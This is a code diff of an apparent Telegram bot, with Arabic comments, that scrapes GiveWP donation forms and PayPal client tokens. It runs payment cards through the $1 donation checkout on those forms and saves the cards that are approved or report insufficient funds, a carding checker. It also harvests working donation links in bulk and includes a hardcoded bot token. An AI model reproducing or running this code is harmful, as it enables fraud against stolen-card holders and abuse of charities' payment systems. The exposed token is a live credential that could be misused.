@@ -11,8 +11,6 @@ import html
 from user_agent import generate_user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
-import psutil
-import signal
 
 # === بيانات البوت ===
 token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
@@ -31,18 +29,10 @@ if not os.path.exists('blockusers.txt'):
 
 processing_status = {}
 
-# === فحص الذاكرة ===
-def check_memory():
-    """فحص الذاكرة المتاحة"""
-    memory = psutil.virtual_memory()
-    return memory.available / (1024 * 1024)  # بالميجابايت
-
+# === تنظيف الذاكرة ===
 def cleanup_memory():
     """تنظيف الذاكرة"""
     gc.collect()
-    if check_memory() < 100:  # أقل من 100MB
-        print(f"⚠️ Low memory: {check_memory():.2f}MB available")
-        gc.collect()
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -190,23 +180,32 @@ def ali_al2(massege):
         bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{e}</code>", parse_mode="HTML")
         return
 
-    user = generate_user_agent()
-    r = requests.Session()
-    headers = {'user-agent': user}
-    res = r.get(url=f"{link}", headers=headers).text
-    id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
-    id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
-    nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
-    anc = re.search(r'"data-client-token":"(.*?)"', res)
-    if anc:
-        enc = re.search(r'"data-client-token":"(.*?)"', res).group(1)
-        dec = base64.b64decode(enc).decode('utf-8')
-        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
-    else:
+    try:
+        user = generate_user_agent()
+        r = requests.Session()
+        headers = {'user-agent': user}
+        res = r.get(url=f"{link}", headers=headers).text
+        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
+        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
+        nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
+        anc = re.search(r'"data-client-token":"(.*?)"', res)
+        if anc:
+            enc = re.search(r'"data-client-token":"(.*?)"', res).group(1)
+            dec = base64.b64decode(enc).decode('utf-8')
+            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+        else:
+            bot.edit_message_text(
+                chat_id=massege.chat.id,
+                message_id=ko.message_id,
+                text='''Data Client Token not found ⚠️''',
+                parse_mode="HTML"
+            )
+            return
+    except Exception as e:
         bot.edit_message_text(
             chat_id=massege.chat.id,
             message_id=ko.message_id,
-            text='''Data Client Token not found ⚠️''',
+            text=f'''Error extracting data ❌\n<code>{str(e)[:100]}</code>''',
             parse_mode="HTML"
         )
         return
@@ -309,17 +308,28 @@ def ali_al2(massege):
         headers=headers,
         data=data
     )
-    pk_live2 = (response.json()['data']['id'])
-    if pk_live2:
-        tok = pk_live2
-    else:
+    
+    try:
+        pk_live2 = (response.json()['data']['id'])
+        if pk_live2:
+            tok = pk_live2
+        else:
+            bot.edit_message_text(
+                chat_id=massege.chat.id,
+                message_id=ko.message_id,
+                text=f'''Token not In Data️''',
+                parse_mode="HTML"
+            )
+            return
+    except:
         bot.edit_message_text(
             chat_id=massege.chat.id,
             message_id=ko.message_id,
-            text=f'''Token not In Data️''',
+            text=f'''Error getting token ❌''',
             parse_mode="HTML"
         )
         return
+
     headers = {
         'authority': 'cors.api.paypal.com',
         'accept': '*/*',
@@ -424,7 +434,10 @@ def ali_al2(massege):
     if 'ORDER_NOT_APPROVED' in response.text:
         aa = 'ORDER_NOT_APPROVED'
     else:
-        aa = response.json()['data']['error']
+        try:
+            aa = response.json()['data']['error']
+        except:
+            aa = 'UNKNOWN'
 
     try:
         msg = aa
@@ -726,7 +739,8 @@ if __name__ == '__main__':
                         ar = input('Enter Card ( n | mm | yy | cvc ): ')
                         rr = PayPal()
                         itt = rr.Key()
-                        pali = rr.Krs                        resulti = pali(ar)
+                        pali = rr.Krs
+                        resulti = pali(ar)
                         if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                             with open('Approved Card.txt', "a") as f:
                                 f.write(ar +f': {{resulti}} > {{Getat}}')
@@ -832,18 +846,16 @@ def process_bulk_file(message):
 ⏱️ جاري المعالجة...""", parse_mode="HTML")
         
         # دالة فحص الرابط
-        def check_link(link, index):
+        def check_link(link):
             try:
                 if not link.startswith(("http://", "https://")):
                     return None
                 
-                # فحص سريع
                 r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=8)
                 if r.status_code != 200:
                     return None
                 
                 res = r.text
-                # البحث عن البيانات المطلوبة
                 id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
                 id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
                 nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
@@ -866,7 +878,6 @@ def process_bulk_file(message):
                 USER_URL2 = f'https://{parsed.netloc}'
                 USER_URL = parsed.path
                 
-                # محاولة استخراج token
                 headers = {
                     'origin': f'{USER_URL2}',
                     'referer': f'{USER_URL}',
@@ -896,7 +907,6 @@ def process_bulk_file(message):
                 if 'data' not in response_json or 'id' not in response_json['data']:
                     return None
                 
-                # الرابط شغال ✅
                 return {
                     'link': link,
                     'id_form1': id_form1,
@@ -909,7 +919,7 @@ def process_bulk_file(message):
             except:
                 return None
         
-        # استخدام queue بدل ThreadPoolExecutor للتحكم في الذاكرة
+        # استخدام queue
         q = queue.Queue()
         live_data = []
         results_lock = threading.Lock()
@@ -921,7 +931,7 @@ def process_bulk_file(message):
             while not q.empty():
                 try:
                     link = q.get(timeout=1)
-                    result = check_link(link, 0)
+                    result = check_link(link)
                     
                     with results_lock:
                         with processing_status[user_id]['lock']:
@@ -932,13 +942,11 @@ def process_bulk_file(message):
                             else:
                                 processing_status[user_id]['dead'] += 1
                             
-                            # تحديث التقدم كل 10 روابط
                             processed = processing_status[user_id]['processed']
                             if processed % 10 == 0 or processed == total:
                                 update_progress(chat_id, status_msg.message_id, user_id)
                     
                     q.task_done()
-                    # تأخير بسيط لتخفيف الضغط
                     time.sleep(0.1)
                 except queue.Empty:
                     break
@@ -974,7 +982,7 @@ def process_bulk_file(message):
             except:
                 pass
         
-        # إنشاء 2 workers فقط لتقليل الضغط
+        # إنشاء 2 workers
         threads = []
         for _ in range(2):
             t = threading.Thread(target=worker)
@@ -982,14 +990,12 @@ def process_bulk_file(message):
             t.start()
             threads.append(t)
         
-        # انتظار الانتهاء
         for t in threads:
             t.join()
         
-        # النتيجة النهائية
         status = processing_status[user_id]
         
-        # إرسال كل رابط حي كملف Python منفصل
+        # إرسال كل رابط حي كملف منفصل
         if live_data:
             for idx, data in enumerate(live_data, 1):
                 try:
@@ -1009,14 +1015,12 @@ Dev: @nnunrr""",
                             parse_mode="HTML"
                         )
                     os.remove(file_name)
-                    # تنظيف الذاكرة بعد كل ملف
                     cleanup_memory()
-                    time.sleep(0.5)  # تأخير بين الملفات
+                    time.sleep(0.5)
                 except Exception as e:
                     print(f"Error sending file {idx}: {e}")
                     continue
             
-            # النتيجة النهائية
             final_text = f"""📊 <b>✅ Bulk Extraction Complete!</b>
 ━━━━━━━━━━━━━━━━━━━━
 📌 Total Links: {status['total']}
@@ -1042,7 +1046,6 @@ Dev: @nnunrr"""
             except:
                 bot.send_message(chat_id, no_live_text, parse_mode="HTML")
         
-        # تنظيف نهائي
         if user_id in processing_status:
             del processing_status[user_id]
         cleanup_memory()
